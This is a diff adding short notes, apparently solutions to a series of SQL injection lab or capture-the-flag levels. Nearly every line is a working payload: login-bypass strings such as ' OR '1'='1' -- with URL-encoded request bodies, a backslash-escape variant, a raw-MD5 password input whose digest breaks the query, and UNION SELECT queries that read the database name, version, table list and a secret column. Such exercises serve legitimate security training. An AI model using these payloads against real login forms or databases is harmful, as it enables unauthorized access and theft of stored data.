@@ -1,0 +1,24 @@
+for s1l_0
+’ OR '1'='1' -- 
+username=victim&password=%27%20OR%20%271%27%3D%271%27%20--%20
+
+sql_1
+\' OR TRUE-- 
+^ backslash is an escape character, so will end the string and then true will evalute
+username=victim&password=%5C%27%20OR%20TRUE--%20
+
+
+sql_2
+username=victim&password=97frd
+string is 97frd
+md5 digest: P(?
+?;9I'||'4hN??
+
+sql_3
+
+COMMANDS:
+' UNION SELECT NULL, NULL, database() -- 
+' UNION SELECT NULL, NULL, @@version -- 
+' UNION SELECT NULL, group_concat(table_name), NULL FROM information_schema.tables WHERE version = '10 --
+' UNION SELECT NULL, NULL, count(*) FROM information_schema.tables# (43 tables starting from 25)
+' UNION SELECT NULL, NULL, secret FROM SECRETTABLE —
